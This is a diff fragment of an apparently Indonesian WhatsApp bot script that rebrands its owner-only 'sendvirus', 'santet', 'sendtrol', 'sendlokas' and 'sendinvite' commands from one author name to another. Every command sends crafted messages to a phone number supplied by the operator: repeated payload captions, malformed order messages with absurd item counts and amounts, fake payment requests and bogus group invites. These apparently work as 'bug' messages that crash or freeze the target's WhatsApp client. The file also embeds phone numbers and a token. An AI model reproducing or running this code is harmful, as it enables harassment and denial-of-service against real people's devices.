 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(from, { image: ppnyauser,  caption: `Tn•Forbidden404${buttonvirus}` }, { quoted:m })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${buttonvirus}` }, { quoted:m })
 sticSukses(from)
 }
 }
@@ -5056,114 +5087,114 @@ if (!isCreator) return m.reply(mess.owner)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(from, { image: ppnyauser,  caption: `Tn•Forbidden404${ngazap(prefix)}`}, { quoted:m })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${ngazap(prefix)}`}, { quoted:m })
 sticSukses(from)
 }
 }
 break
 case 'sendvirus': {
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
-haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Tn•Forbidden404${iphone}` }, { quoted:m })
+haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${iphone}` }, { quoted:m })
 sticSukses(from)
 }
 break
 //=================================================//
 case 'sendvirus2': {
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
-haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Tn•Forbidden404${iphone1}` }, { quoted:m })
+haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${iphone1}` }, { quoted:m })
 sticSukses(from)
 }
 break
 //=================================================//
 case 'sendvirus3': {
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
-haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Tn•Forbidden404${iphone2}` }, { quoted:m })
+haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${iphone2}` }, { quoted:m })
 sticSukses(from)
 }
 break
 //=================================================//
 case 'sendvirus4': {
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
-haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Tn•Forbidden404${iphone3}` }, { quoted:m })
+haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${iphone3}` }, { quoted:m })
 sticSukses(from)
 }
 break
 //=================================================//
 case 'sendvirus5': {
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
-haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Tn•Forbidden404${iphone4}` }, { quoted:m })
+haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${iphone4}` }, { quoted:m })
 sticSukses(from)
 }
 break
 //=================================================//
 case 'sendvirus6': {
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
-haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Tn•Forbidden404${iphone5}` }, { quoted:m })
+haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${iphone5}` }, { quoted:m })
 sticSukses(from)
 }
 break
 //=================================================//
 case 'sendvirus7': {
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
-haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Tn•Forbidden404${iphone6}` }, { quoted:m })
+haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${iphone6}` }, { quoted:m })
 sticSukses(from)
 }
 break
 //=================================================//
 case 'sendvirus8': {
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
-haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Tn•Forbidden404${buttonkal}` }, { quoted:m })
+haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${buttonkal}` }, { quoted:m })
 sticSukses(from)
 }
 break
 //=================================================//
 case 'sendvirus9': {
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
-haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Tn•Forbidden404${buttonvirus}` }, { quoted:m })
+haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${buttonvirus}` }, { quoted:m })
 sticSukses(from)
 }
 break
 //=================================================//
 case 'sendvirus10': {
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
-haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Tn•Forbidden404${ngazap(prefix)}`}, { quoted:m })
+haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${ngazap(prefix)}`}, { quoted:m })
 sticSukses(from)
 }
 break
 //=================================================//
 case 'jadijago': {
 if (!isCreator) return m.reply(mess.owner)
-if (!text) throw `Contoh : ${prefix + command} Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
  var message = {
 image: virgam,
 mimetype: 'image/jpeg',
- caption: `Tn•Forbidden404`,
+ caption: `HW MODS WA`,
 footer: ` ${ngazap(prefix)} `,
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6285814480623'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs ${iphone6}`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ ${iphone6}`, id: `x`}},
@@ -5179,14 +5210,14 @@ break
 //=================================================//
 case 'sendlokas': case 'sendlokas3': case 'sendlokas4': case 'sendlokas5': {
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
 "degreesLongitude": 107.7228574,
-"caption": `© Tn•Forbidden404${ngazap(prefix)}`,
+"caption": `© HW MODS WA${ngazap(prefix)}`,
 "sequenceNumber": "1657237469254001",
 "jpegThumbnail": messa.imageMessage,
 }
@@ -5198,14 +5229,14 @@ break
 //=================================================//
 case 'sendlokas2': {
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var location = generateWAMessageFromContent(from, proto.Message.fromObject({
 "locationMessage": {
 "degreesLatitude": -6.936928157735237,
 "degreesLongitude": 107.72270679473877,
-"caption": `© Tn•Forbidden404${ngazap(prefix)}`,
+"caption": `© HW MODS WA${ngazap(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: from, quoted:m})
@@ -5216,7 +5247,7 @@ break
 //=================================================//
 case 'sendtrol2': {
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var order = generateWAMessageFromContent(from, proto.Message.fromObject({
@@ -5226,10 +5257,10 @@ var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 "itemCount": 100000000000,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": `© Tn•Forbidden404${ngazap(prefix)}`,
+"message": `© HW MODS WA${ngazap(prefix)}`,
 "jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
-"orderTitle": `© Tn•Forbidden404${ngazap(prefix)}`,
-"sellerJid": "6285814480623@s.whatsapp.net",
+"orderTitle": `© HW MODS WA${ngazap(prefix)}`,
+"sellerJid": "6285714170944@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
 "totalCurrencyCode": "IDR",
@@ -5266,14 +5297,14 @@ sticSukses(from)
 // BUG OWNER
 case 'santet': case 'santet2': case 'santet3': case 'santet4': case 'santet5': {
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
 var requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "requestPaymentMessage": {
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER TN FORBIDDEN404`,
+"text": `MY DEVELOPER HW MODS WA`,
 }
 }}), { userJid: from, quoted:m})
 haikal.relayMessage(bnnd, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -5287,7 +5318,7 @@ if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nConto
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
-haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `DEVELOPER TN FORBIDDEN404`,"body": `Selamat ${salam} kak ${pushname}`,
+haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `DEVELOPER HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`,
 mimetype: 'audio/mpeg', caption: `${buttonkal}`,
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -5302,9 +5333,9 @@ case 'buggastick':{
 if (!isCreator) return m.reply(mess.owner)
 haikal.sendImageAsSticker(from, fs.readFileSync('./baseikal/stickernye/SuksesCok.webp'), m, { packname: global.packname, author: global.author, contextInfo:{  externalAdReply: { showAdAttribution: true,
 mediaType:  1,
-mediaUrl: 'https://wa.me/6285814480623',
+mediaUrl: 'https://wa.me/6281214281312',
 title: `${buttonvirus}`,
-sourceUrl: `https://wa.me/6285814480623`, 
+sourceUrl: `https://wa.me/6281214281312`, 
 thumbnail: virgam
 }
 }}, { text:`haha` }, { quoted: m})
@@ -5314,9 +5345,9 @@ case 'buggamvn':{
 if (!isCreator) return m.reply(mess.owner)
 haikal.sendMessage(from, {audio: fs.readFileSync('./baseikal/sound/ketawa.mp3'), mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
 mediaType:  1,
-mediaUrl: 'https://wa.me/6285814480623',
-title: `Tn•Forbidden404`,
-sourceUrl: `https://wa.me/6285814480623`, 
+mediaUrl: 'https://wa.me/6281214281312',
+title: `HW MODS WA`,
+sourceUrl: `https://wa.me/6281214281312`, 
 thumbnail: virgam
 }
 }}, { text:`haha` }, { quoted: m})
@@ -5325,15 +5356,15 @@ break
 //=================================================//
 case 'sendinvite': case 'sendinvite2': case 'sendinvite3': case 'sendinvite4': case 'sendinvite5':{
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
 "groupInviteMessage": {
 "groupJid": "85296556573-1328272333@g.us",
 "inviteCode": "wFHwtOxGQN8OwK2x",
-"inviteExpiration": `MY NAME Tn•Forbidden404${ngazap(prefix)}`,
-"groupName": `MY NAME Tn•Forbidden404${ngazap(prefix)}`,
+"inviteExpiration": `MY NAME HW MODS WA${ngazap(prefix)}`,
+"groupName": `MY NAME HW MODS WA${ngazap(prefix)}`,
 "caption": `${ngazap(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
